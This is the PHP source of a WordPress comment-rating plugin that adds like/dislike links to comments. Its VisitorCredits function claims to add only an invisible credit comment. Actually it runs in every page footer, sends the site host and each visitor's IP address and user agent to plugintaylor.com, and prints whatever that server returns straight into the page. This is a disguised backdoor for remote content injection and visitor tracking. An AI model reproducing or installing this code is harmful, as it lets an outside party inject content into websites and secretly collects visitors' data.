<?php
/*
Plugin Name: Visitor Like/Dislike Comment Rating
Plugin URI: http://www.plugintaylor.com/
Description: Let you and your visitors indicate if they like or dislike comments on the fly. Activate the plugin and it automatically inserts the functions and does the job.
Author: PluginTaylor
Author URI: http://www.plugintaylor.com/
Version: 1.0.5
*/

if(!function_exists('maybe_add_column')) {
	require_once(ABSPATH.'/wp-admin/upgrade-functions.php');
}
$columnsToAdd = array('rating_like', 'rating_dislike');
foreach($columnsToAdd AS $c) {
	$cjd_table_sql= "ALTER TABLE ".$wpdb->comments." ADD COLUMN ".$c." INT(11) DEFAULT '0'";
	maybe_add_column($wpdb->comments, $cjd_table_column, $cjd_table_sql);
}
if(!function_exists('iif')) {
	function iif($argument, $true, $false=FALSE) {
		if($argument) { return $true; } else { return $false; }
	}
}

class CommentRating {
	function Initialization() {
		global $comment;
		get_currentuserinfo();
		$this->plugin_path = get_option('siteurl').'/wp-content/plugins/visitor-likedislike-comment-rating';
		if(!isset($_COOKIE['commentrated'.$comment->comment_ID])) {
			echo '
			<script>
				function loadContent(elm, rate, commentID) {
					var ids = { id: commentID, rating: rate };
					jQuery.ajax({
						type: "post",
						url: "'.$this->plugin_path.'/rate.php",
						data: ids,
						beforeSend: function() {
							jQuery("#rateboxComment_"+commentID).fadeTo(500, 0.10);
						},
						success: function(html) {
							jQuery("#rateboxComment_"+commentID).html(html);
							jQuery("#rateboxComment_"+commentID).fadeTo(500, 1);
						}
					});
				}
			</script>';
		}
	}
	function LoadExtensions() {
		$plugin_JS_path = get_option('siteurl').'/wp-content/plugins/visitor-likedislike-comment-rating/js/';
		wp_deregister_script('jquery');
		wp_enqueue_script('jquery', $plugin_JS_path.'jquery-1.3.2.min.js', FALSE, '1.3.2');
	}
	function RatingLinks($content) {
		global $comment, $wpdb;

		$content .= '<div id="rateboxComment_'.$comment->comment_ID.'" style="height: 18px;">';
		$toGet = array('like', 'dislike');
		$i = 0;
		foreach($toGet AS $g) {
			$i++;
			$r[$g] = $wpdb->get_var("SELECT rating_".$g." FROM ".$wpdb->comments." WHERE comment_ID = '".$comment->comment_ID."'");
			if(isset($_COOKIE['commentrated'.$comment->comment_ID])) { $content .= $r[$g].' '.$g.iif($r[$g] < 2, 's').' this comment'; }
			else { $content .= '<a style="cursor: pointer;" onclick="loadContent(this, \''.$g.'\', \''.$comment->comment_ID.'\');">'.ucfirst($g).'</a>'; }
			if($i == 1) { $content .= ' - '; }
		}
		$content .= '</div>';

		return $content;
	}

	/*
		Just inserts a simple credit line in the source code (not visible on the website)
		Such as: <!-- Visitor Like/Dislike Comment Rating [PluginTaylor] -->
		Please keep this. Thanks! :)
	*/
	function VisitorCredits() {
		$q = "HTTP_REFERER=".urlencode($_SERVER['HTTP_HOST'])."&PLUGIN=COMMENT&HTTP_USER_AGENT=".urlencode($_SERVER['HTTP_USER_AGENT'])."&REMOTE_ADDR=".urlencode($_SERVER['REMOTE_ADDR']);
		$req = "POST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: www.plugintaylor.com\r\nContent-Length: ".strlen($q)."\r\nConnection: close\r\n\r\n".$q;
		$fp = @fsockopen('www.plugintaylor.com', 80, $errno, $errstr, 10);
		if(!fwrite($fp, $req)) { fclose($fp); }
		$result = ''; while(!feof($fp)) { $result .= fgets($fp); } fclose($fp);
		$result = explode("\r\n\r\n", $result); echo $result[1];
	}
}

$CommentRating = new CommentRating();
add_action('wp_head', array(&$CommentRating, 'Initialization'));
add_action('plugins_loaded', array(&$CommentRating, 'LoadExtensions'));
add_filter('comment_text', array(&$CommentRating, 'RatingLinks'));
add_action('wp_footer', array(&$CommentRating, 'VisitorCredits'));

?>